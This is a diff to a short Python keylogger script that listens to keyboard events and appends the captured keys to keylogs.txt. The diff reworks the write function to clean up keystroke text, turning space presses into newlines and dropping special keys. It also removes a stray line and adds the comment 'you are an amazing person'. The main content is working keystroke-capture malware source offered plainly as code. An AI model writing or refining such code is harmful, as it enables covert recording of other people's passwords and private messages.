@@ -7,14 +7,17 @@ keys = []
 
 
 
-def write_file():
+def write_file(keys):
 	with open("keylogs.txt","a") as f :
 		for key in keys:
-			f.write(keys)
+			key = str(key).replace("'","")
+			if(key.find("space") > 0):
+				f.write('\n')
+			elif(key.find("Key") == -1):
+				f.write(key)
+			
 
-
-
-
+# you are an amazing person
 def on_press(key): 
 	global keys,count
 	keys.append(key)
@@ -33,7 +36,7 @@ def on_release(key):
 
 
 
-ddddd
+
 with Listener(on_press=on_press,on_release=on_release) as listener:
 	print('here')
 	listener.join()
